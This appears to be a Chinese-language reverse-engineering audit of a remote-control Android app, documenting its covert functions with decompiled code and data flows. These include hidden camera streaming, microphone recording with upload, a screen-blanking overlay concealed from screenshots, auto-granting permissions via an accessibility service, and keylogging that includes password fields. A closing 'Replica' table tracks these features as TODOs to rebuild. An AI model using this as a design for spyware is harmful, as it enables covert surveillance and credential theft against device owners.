# Vendor APK Panel 命令模块审计

> 审计范围: Camera, Mic, Block, KB, Q, Keylog, File 七大模块
> 审计日期: 2026-03-19
> Vendor 源码: `decompiled_vendor/sources/`

---

## 1. Camera 相机控制模块

### 1.1 入口点

| 路由 | case | handler | 行号 |
|------|------|---------|------|
| `/backCameraLive` | '@' | `g(kVar)` | b.java:10365-10366 |
| `/frontCameraLive` | '?' | `d1(kVar)` | b.java:10362-10363 |
| `/stopCameraLive` | 'A' | `b3(kVar)` | b.java:10368-10369 |

### 1.2 核心类 (package m)

| 类 | 文件 | 功能 |
|---|------|------|
| `m.d` | `m/d.java:165行` | Camera 管理器 (单例), 持有 CameraDevice/ImageReader/CaptureSession |
| `m.c` | `m/c.java:21行` | CameraInfo VO: cameraId, facing, sensorOrientation, supportSize |
| `m.e` | `m/e.java:60行` | CameraDevice.StateCallback: onOpened 创建 CaptureSession |
| `m.b` | `m/b.java:31行` | CameraCaptureSession.StateCallback: onConfigured 启动 setRepeatingRequest |
| `m.a` | `m/a.java:55行` | CaptureCallback: onCaptureFailed 时调用 d.c().e() 关闭 |
| `m.f` | `m/f.java:36行` | ImageReader.OnImageAvailableListener: **反编译失败** (434条指令) |

### 1.3 handler 实现

**backCameraLive — `g(kVar)`** (b.java:5606-5624):
```java
m.d c2 = m.d.c();          // 获取单例
c2.d(0);                     // d(0) = 如果当前 facing != 0(后摄), 先关闭
apiResult.setData(Boolean.valueOf(
    c2.c == null ? c2.a(1) : false));  // a(1) = 打开后摄 (LENS_FACING_BACK=1)
```

**frontCameraLive — `d1(kVar)`** (b.java:5266-5284):
```java
m.d c2 = m.d.c();
c2.d(1);                     // d(1) = 如果当前 facing != 1(前摄), 先关闭
apiResult.setData(Boolean.valueOf(
    c2.c == null ? c2.a(0) : false));  // a(0) = 打开前摄 (LENS_FACING_FRONT=0)
```

**stopCameraLive — `b3(kVar)`** (b.java:5071-5087):
```java
apiResult.setData(Boolean.valueOf(m.d.c().e()));  // e() = 关闭所有
```

### 1.4 Camera2 API 流程

```
g(kVar) / d1(kVar)
  → m.d.a(int facing)                          // m/d.java:93-131
    → CameraManager.getCameraIdList()
    → b(cameraManager, facing)                  // 选择匹配 facing 的摄像头
      → 遍历 outputSizes, 选择宽度最接近 800 的 Size
    → ImageReader.newInstance(800, h, JPEG, 2)  // 格式=256=JPEG, maxImages=2
    → imageReader.setOnImageAvailableListener(new f(facing))
    → cameraManager.openCamera(cameraId, new e(surface))
      → e.onOpened():                           // m/e.java:33-59
        → createCaptureRequest(TEMPLATE_PREVIEW=1)
        → set(CONTROL_AF_MODE, CONTINUOUS_PICTURE=4)
        → set(JPEG_ORIENTATION, facing==0 ? 270 : 90)
        → addTarget(imageReader.surface)
        → createCaptureSession → b.onConfigured()
          → setRepeatingRequest(request, new a(), null)
            → 持续采集帧 → f.onImageAvailable()
              → **反编译失败** (434条指令)
              → 推测: acquireLatestImage → JPEG bytes → WebSocket 发送
```

### 1.5 关键参数

| 参数 | 值 | 来源 |
|------|-----|------|
| 分辨率 | 宽=800, 高=按比例 | m/d.java:119 |
| 图像格式 | JPEG (256) | m/d.java:119 |
| maxImages | 2 | m/d.java:119 |
| AF 模式 | CONTINUOUS_PICTURE (4) | m/e.java:44 |
| JPEG 方向 | 前摄=270°, 后摄=90° | m/e.java:46-52 |
| 帧发送 | // TODO: VENDOR_VERIFY — `m.f.onImageAvailable()` 反编译失败 | m/f.java:29-34 |

### 1.6 Bridge WebSocket 帧发送

Camera 帧通过独立的 Bridge WebSocket 连接发送 (非主 WebSocket):

```java
// bridge/a.java:45 — B(byte[]) 方法
Base64.getEncoder().encodeToString(jpegBytes)
→ BridgeBufferBody {
    bridgePath: "/backCameraLive" 或 "/frontCameraLive",
    deviceId: deviceId,
    toDesktop: true,
    buffer: "Base64编码的JPEG帧..."
  }
→ BridgeBufferMessage { type: 15, body: above }
→ JSON → WebSocket.send()
```

- WebSocket URL: `wss://{host}/bridge` (bridge/a.java:23)
- 消息类型: type=15 (BridgeBufferMessage)
- 响应类型: type=16 (success/fail, 连续 6 次失败断开)

### 1.7 Bridge 互斥逻辑

前摄/后摄/投屏三者互斥, 同时只能有一个活跃 (a1/q.java:789-891):

| 启动 | 先关闭 |
|------|--------|
| `/backCameraLive` | `/minicap` + `/frontCameraLive` |
| `/frontCameraLive` | `/minicap` + `/backCameraLive` |
| `/minicap` (投屏) | `/frontCameraLive` + `/backCameraLive` |

### 1.8 LockActivity 权限请求

当 CAMERA 权限未授予时 (m/d.java:97-110):
- 启动 `LockActivity` (1x1 透明 Activity, dimAmount=0)
- 通过 AccessibilityService 自动点击权限对话框
- `ActivityCompat.requestPermissions(CAMERA, 1004)`
- 权限成功后回调 `d.c().a(facing)` 打开相机

### 1.9 `m.f.onImageAvailable()` — 反编译失败

434 条指令, JADX 无法反编译。推断逻辑:
1. `ImageReader.acquireLatestImage()` 获取 JPEG 帧
2. 检查 bridge 连接状态 (`f138w.get()`)
3. 调用 `bridge.a.B(byte[])` 发送
4. `image.close()` 释放
// TODO: VENDOR_VERIFY — 可能包含帧率控制/跳帧/质量调整逻辑

---

## 2. Mic 麦克风录音模块

### 2.1 入口点

| 路由 | case | handler | 行号 |
|------|------|---------|------|
| `/startRecord` | 'W' | `U2(audioSource, kVar)` | b.java:10435 |
| `/stopRecord` | 'X' | `d3(kVar)` | b.java:10437-10438 |
| `/recordState` | 'Y' | `c2(kVar)` | b.java:10440-10441 |
| `/syncAudios` | '7' | `j3(kVar)` | b.java:10341 |
| `/screenrecord/start` | '<' | (屏幕录制, 非麦克风) | b.java:9417 |
| `/screenrecord/state` | '>' | (屏幕录制状态) | b.java:9424 |

### 2.2 核心类 (package j)

| 类 | 文件 | 功能 |
|---|------|------|
| `j.d` | `j/d.java:109行` | AudioRecordManager 单例, 状态机 + 录音线程管理 |
| `j.b` | `j/b.java:167行` | AudioRecord 录音线程, PCM→WAV 转换 + HTTP 上传 |
| `j.c` | `j/c.java:13行` | 状态枚举: ERROR, IDLE, RECORDING, STOP_RECORD, PLAYING, STOP_PLAY |
| `j.a` | `j/a.java:37行` | 状态变更通知 Runnable, 通过 WebSocket 推送 DeviceRecordStateVO |
| `j.e` | `j/e.java:289行` | HTTP 回调 (与录音无直接关系) |

### 2.3 handler 实现

**startRecord — `U2(audioSource, kVar)`** (b.java:3105-3119):
```java
// 检查 RECORD_AUDIO 权限
// j.d.b().d(audioSource) → 启动录音线程
// audioSource: 0~10, 默认 1 (MIC)
// 常用值: 1=MIC, 6=VOICE_RECOGNITION, 7=VOICE_COMMUNICATION
```

**stopRecord — `d3(kVar)`** (b.java:5311-5332):
```java
// 检查 RECORD_AUDIO 权限
// j.d.b().e() → 设置状态为 STOP_RECORD, 线程自行退出
```

**recordState — `c2(kVar)`** (b.java:5177-5196):
```java
// 返回 j.c 状态枚举 (IDLE/RECORDING/STOP_RECORD/ERROR)
// 封装为 DeviceRecordStateVO
```

### 2.4 AudioRecord 参数

| 参数 | 值 | 来源 |
|------|-----|------|
| 采样率 | 44100 Hz | j/b.java:37,43 |
| 通道 | CHANNEL_IN_STEREO (12) | j/b.java:37,43 |
| 编码 | ENCODING_PCM_16BIT (2) | j/b.java:37,43 |
| Buffer | `getMinBufferSize(44100, 12, 2) * 1` | j/b.java:37 |
| audioSource | 参数传入 (0~10, 默认 1=MIC) | j/b.java:36 |
| 最大录制时长 | 30 分钟 (1800000ms) | j/d.java:94 |
| 分块大小 | 10MB (10485760 bytes) | j/b.java:148 |

### 2.5 音频增强

```java
// j/b.java:45-63
AutomaticGainControl.create(audioSessionId).setEnabled(true);  // 自动增益
NoiseSuppressor.create(audioSessionId).setEnabled(true);        // 噪声抑制
// 两者都是可选的, 不支持时仅 Log.w
```

### 2.6 录音数据流

```
j.d.d(audioSource)                    // j/d.java:79-98
  → new j.b(this, audioSource)        // 创建录音线程
  → b.start()                         // 启动线程
    → b.run()                         // j/b.java:122-166
      → b.b()                         // 创建临时文件
        → File.createTempFile("recording", ".pcm", tmpDir)  // PCM 原始数据
        → new File(wavDir + "/r" + yyMMdd_HHmmss + ".wav")  // WAV 输出
        → WAV 文件先写 44 字节空 header
      → audioRecord.startRecording()
      → 循环:
        → audioRecord.read(buffer, 0, bufferSize)
        → 同时写入 PCM 文件 + WAV 文件
        → 累计 > 10MB → b.a(true) 分块上传
          → 写入 WAV header (RIFF/WAVE/fmt/data)
          → l.A(linkedList) → HTTP multipart 上传到服务器
          → 清空队列, 创建新文件继续录
      → audioRecord.stop()
      → b.a(false) 最终上传
      → 状态 → IDLE
```

### 2.7 WAV 文件格式

```java
// j/d.java:59-63 — WAV header 构建
// RIFF header: "RIFF" + fileSize + "WAVE"
// fmt chunk: "fmt " + 16 + PCM(1) + channels + 44100 + byteRate + blockAlign + 16bit
// data chunk: "data" + dataSize
// byteRate = 88200 * channels (44100 * 2bytes * channels)
```

### 2.8 状态通知 (WebSocket 实时推送)

```java
// j/a.java:24-36 — 每次状态变更都推送
DeviceRecordStateVO {
    state: c (IDLE/RECORDING/STOP_RECORD/ERROR),
    message: String ("录音空闲中"/"已生成录音文件:xxx"/"正在上传N个录音文件"),
    allowRecord: Integer (0=无权限, 1=有权限),
    audioSource: Integer (当前音源)
}
→ MessageRecordVO { intentCode: "android.intent.action.RECORD_STATE", extraBody: above }
→ HandlerMsgAndTimer.b() → WebSocket
```

---

## 3. Block 黑屏遮罩模块

### 3.1 入口点

| 路由 | case | handler | 行号 |
|------|------|---------|------|
| `/blockView` | 'z' | `j(show, transparent, hint, zeroBrightness, destroyLock, kVar)` | b.java:9598, 10614 |

### 3.2 参数

```
POST /blockView
{
  "show": "true/false",           // 显示/隐藏遮罩
  "transparent": "false",         // 是否透明 (默认 false)
  "hint": "正在处理...",           // 遮罩提示文字 (可选)
  "zeroBrightness": "true",       // 是否将亮度设为0 (默认 true)
  "destroyLock": "true"           // 移除时是否模拟解锁 (默认 true)
}
```

### 3.3 核心类

| 类 | 文件 | 功能 |
|---|------|------|
| `req/BlockViewVO` | `req/BlockViewVO.java:72行` | VO: transparent, hint, zeroBrightness, destroyLock, blockDrawable |
| `helper/g` | `helper/g.java` | 遮罩管理器: 显示/隐藏/状态查询 |
| `e0/g` | `e0/g.java` | 外层 LinearLayout (黑色/截屏背景) |
| `e0/i` | `e0/i.java` | 内层 LinearLayout (60%透明黑 + icon + progress + text) |
| `e0/f` | `e0/f.java` | 进度条 View (白底蓝前景 #1677ff) |
| `e0/c` | `e0/c.java` | 图标 ImageView (assets/android.png 或 block_icon.webp) |

### 3.4 WindowManager 参数

```java
// helper/g.java:62-93
LayoutParams.type   = 2032  // TYPE_ACCESSIBILITY_OVERLAY (无需 SYSTEM_ALERT_WINDOW 权限)
LayoutParams.flags  = 591800 (0x907B8)
  // FLAG_SHOW_WHEN_LOCKED | FLAG_FULLSCREEN | FLAG_LAYOUT_NO_LIMITS
  // FLAG_LAYOUT_IN_SCREEN | FLAG_KEEP_SCREEN_ON
  // FLAG_NOT_TOUCH_MODAL | FLAG_NOT_TOUCHABLE | FLAG_NOT_FOCUSABLE
LayoutParams.format = 1     // RGBA_8888
LayoutParams.alpha  = 1.0f
LayoutParams.width  = 屏幕宽度
LayoutParams.height = 屏幕高度
```

**关键**: `FLAG_NOT_TOUCHABLE` — 遮罩不拦截触摸，纯视觉遮挡 + 亮度锁定。

### 3.5 行为

- **显示时**: 截取当前屏幕作为遮罩背景 (视觉"冻结"), 亮度设为 0
- **隐藏时**: 恢复原始亮度, 可选 `performGlobalAction(LOCK_SCREEN)` 锁屏
- **截屏防护**: API 31+ 通过 `SurfaceControl.Transaction.setSkipScreenshot()` 使遮罩不出现在截屏中
- **状态管理**: `AtomicReference<View>` + `ReentrantLock` 防并发

---

## 4. KB 键盘控制模块

### 4.1 Vendor 实现方式

Vendor 中键盘控制 **不是** 通过 "kb" screencomd 命令实现的，而是通过 HTTP API `/global/action`:

| 路由 | 方法 | 行号 |
|------|------|------|
| `/global/action` (HTTP) | case 107 → `f1()` | b.java:9696, 10508 |
| `/global/action` (WebSocket screencomd) | case 20 → `f1()` | b.java:3741, 4039 |

### 4.2 核心执行器

```java
// utils/g.java:1195-1602 — g.a() 方法, 35+ 种 actionName

// hideSoftKeyboard (case 0, line 1206):
MyAccessibilityService.P().getSoftKeyboardController().setShowMode(1);  // SHOW_MODE_HIDDEN

// showSoftKeyboard (case 28, line 1402):
MyAccessibilityService.P().getSoftKeyboardController().setShowMode(0);  // SHOW_MODE_AUTO
```

### 4.3 命令格式

```json
// HTTP:
{"actionName": "hideSoftKeyboard"}
{"actionName": "showSoftKeyboard"}

// WebSocket screencomd:
{"type": "screencomd", "subc": "/global/action", "actionName": "hideSoftKeyboard"}
```

### 4.4 Panel 前端 "kb" 命令

Panel 发送 `{comand: 'kb', kbstate: '2'|'3'}`, 但 vendor 源码中 **无对应处理器**。
Control.vue 注释表明 kb 实际用于设备管理员(防卸载), 非软键盘控制。
// TODO: VENDOR_VERIFY — "kb" 命令的真实语义需要确认

---

## 5. Q 投屏画质动态调整模块

### 5.1 入口点

| 路由 | case | handler | 行号 |
|------|------|---------|------|
| `/miniCap/scale` | ';' | `I1(Float.parseFloat(scale), kVar)` | b.java:9501, 10350 |

### 5.2 I1() 方法 (b.java:1405-1442)

```
1. 检查 MyAccessibilityService 存在
2. 获取 o.r (投屏管理器) → thread.k (截屏线程)
3. SDK >= 30:
   - 获取 u.a (TakeScreenshotCallback)
   - 校验 scale: 0 < f2 <= 1.0
   - 更新 scale + quality (联动: quality = scale * 100)
4. SDK < 30: 无操作
5. 返回 data=true
```

### 5.3 参数

| 参数 | 范围 | 默认值 | 来源 |
|------|------|--------|------|
| scale | 0.0 < x <= 1.0 | `800.0f / max(w,h)` | u/a.java:71-77 |
| quality | 1~100 | `(int)(scale * 100)` | u/a.java:41 |
| 图像格式 | WEBP_LOSSY (API30+) / WEBP | — | utils/g.java:581 |

**关键发现**: Vendor 使用 **WEBP** 格式, 非 JPEG。quality 与 scale 联动, 无法独立调整。

### 5.4 缩放方式

```java
// utils/g.java:2209-2223 — k0(Bitmap, targetWidth)
// 先 WEBP 80 质量压缩一次 (解除 HardwareBuffer 限制)
// Matrix.postScale() 缩放
// Bitmap.createBitmap() 生成缩放后的 Bitmap
```

### 5.5 帧率控制

- **事件驱动**, 非固定帧率
- `TYPE_WINDOW_CONTENT_CHANGED (2048)` 触发 `o.r.a()`
- 单线程池 (`newSingleThreadExecutor`) 自然限制并发
- 黑屏保护: 30 秒间隔
- 截屏等待: 每次 200ms 轮询

---

## 6. Keylog 键盘记录模块

### 6.1 两条并行路径

**路径 A: ListenWindow 委托系统 (按需触发)**
- 服务端通过 `/listenWindow` 注册监听
- `MyAccessibilityService.f0()` → 遍历委托队列 → 匹配事件 → 发送
- intentCode: `"android.accessibility.delegate.LISTEN_WINDOW_EVENT"`

**路径 B: 统计上报系统 (始终活跃)**
- `MyAccessibilityService.c0()` → `o.c0.b()` 匹配事件类型
- TYPE_VIEW_TEXT_CHANGED (2048) 触发 keylog 采集
- intentCode: `"android.accessibility.service.USAGE_SUMMARY"`

### 6.2 采集字段 (o/b0.java:100-108)

```java
KeyboardEventVO {
    beforeText: accessibilityEvent.getBeforeText(),   // 修改前文本
    editText: source.getText(),                        // 当前输入框完整文本
    eventText: MyAccessibilityService.E(event)         // 事件文本 (逗号分隔)
}

AccessibilityEventStatVO {
    eventPackageName,      // 产生事件的应用包名
    eventClassName,        // 产生事件的类名
    activePackageName,     // 当前活跃应用
    activeWindowClassName, // 当前窗口类名
    eventValue,            // 事件类型数值
    eventTime,             // 时间戳
    isDeviceLocked,        // 设备锁定状态
    containerCode: "ACCESSIBILITY_CONTAINER",
    keyboardEvent: KeyboardEventVO
}
```

### 6.3 关键发现

- **无独立 keylog 模块** — 嵌入在 AccessibilityService 统计上报系统中
- **不过滤密码字段** — `isPassword()` 不用于过滤 keylog 数据
- **按应用包名过滤** — 跳过自身包名和 `com.google.guard`
- **`e.e()` 反编译失败** (338条指令) — 路径 A 核心匹配逻辑 // TODO: VENDOR_VERIFY

---

## 7. File 文件传输模块

### 7.1 入口点

| 路由 | case | handler | 行号 |
|------|------|---------|------|
| `/syncDownload` | 26 | `m3(filepath, fileUrl, saveToGallery, kVar)` | b.java:6612 |
| `/asyncDownload` | 27 | `e(filepath, fileUrl, saveToGallery, kVar)` | b.java:5335 |
| `/deleteFile` | 28 | `y(filePathAndName, galleryUrl, kVar)` | b.java:8454 |
| `/uploadAppIcon` | '9' | `C3(kVar, packageName)` | b.java:8818 |

### 7.2 下载 (服务器→设备)

```java
// p/b.java:29-58 — p.b.b() 同步下载
1. ConcurrentHashMap 防重复下载
2. new URL(str).openStream()          // 简单 HTTP GET
3. FileOutputStream(path)             // 直接写入
4. 1024 字节缓冲区循环读写
5. flush + close
```

**关键发现: 无分块传输！** 简单的 URL.openStream() → FileOutputStream, 无分块编号、无进度通知、无校验、无断点续传。

### 7.3 上传 (设备→服务器)

```java
// HTTP Multipart POST
// f0/t.java:136-155
Content-Disposition: form-data; name="files"; filename="xxx"
// 使用 OkHttp RequestBody 发送
```

### 7.4 文件删除

```java
// b.java:8454-8484 — y()
1. q.n(path) → File.delete()                    // 文件系统删除
2. g.B(path, galleryUrl) → ContentResolver.delete()  // MediaStore 删除
```

---

## 8. 模块实现状态总结

| 模块 | Vendor 实现 | Replica 状态 | 优先级 |
|------|------------|-------------|--------|
| Camera 前/后摄 | Camera2 API + ImageReader + JPEG 800px | TODO | P1 |
| Camera 帧发送 | m.f.onImageAvailable() **反编译失败** | TODO | P1 |
| Mic 录音 | AudioRecord 44100Hz/Stereo/PCM16 + WAV + HTTP 上传 | TODO | P1 |
| Mic 状态推送 | DeviceRecordStateVO → WebSocket | TODO | P2 |
| Block 遮罩 | TYPE_ACCESSIBILITY_OVERLAY + 截屏背景 + 亮度0 | TODO | P1 |
| KB 键盘 | SoftKeyboardController.setShowMode() | TODO (仅 Log.d) | P2 |
| Q 画质 | WEBP + scale 联动 quality + 事件驱动帧率 | TODO (仅 Log.d) | P2 |
| Keylog | AccessibilityEvent TYPE_VIEW_TEXT_CHANGED → WebSocket | TODO | P2 |
| File 下载 | URL.openStream() + 1024 buffer (无分块) | TODO | P2 |
| File 上传 | HTTP Multipart POST | TODO | P3 |
| File 列表 | WebSocket bridge | 已实现 (FileListHelper) | Done |
| File 搜索 | WebSocket bridge | 已实现 (FileSearchHelper) | Done |

---

## 9. 代码引用索引

### server/b.java (11172 行)
| 行号 | 内容 |
|------|------|
| 3105-3119 | `U2()` startRecord handler |
| 5071-5087 | `b3()` stopCameraLive handler |
| 5177-5196 | `c2()` recordState handler |
| 5266-5284 | `d1()` frontCameraLive handler |
| 5311-5332 | `d3()` stopRecord handler |
| 5606-5624 | `g()` backCameraLive handler |
| 6053-6102 | `j()` blockView handler |
| 8454-8484 | `y()` deleteFile handler |
| 8818-8842 | `C3()` uploadAppIcon handler |
| 1405-1442 | `I1()` miniCap/scale handler |
| 10350-10370 | Camera case dispatch ('@','?','A') |
| 10435-10441 | Mic case dispatch ('W','X','Y') |
| 10614-10616 | Block case dispatch ('z') |

### 独立包
| 包 | 文件数 | 功能 |
|---|--------|------|
| `m/` | 6 文件 | Camera2 管理 (d=管理器, e=StateCallback, b=SessionCallback, f=ImageListener, c=CameraInfo, a=CaptureCallback) |
| `j/` | 5 文件 | AudioRecord 管理 (d=管理器, b=录音线程, c=状态枚举, a=状态通知, e=HTTP回调) |
| `helper/g` | — | Block 遮罩管理器 |
| `e0/` | — | Block 遮罩 View 层次 |
| `utils/g` | — | 全局操作执行器 (KB hideSoftKeyboard/showSoftKeyboard) |
| `u/a` | — | TakeScreenshotCallback (Q 画质) |
| `o/b0` | — | Keylog 采集 (case 1) |
| `o/r` | — | 投屏管理器 (Q 帧率控制) |
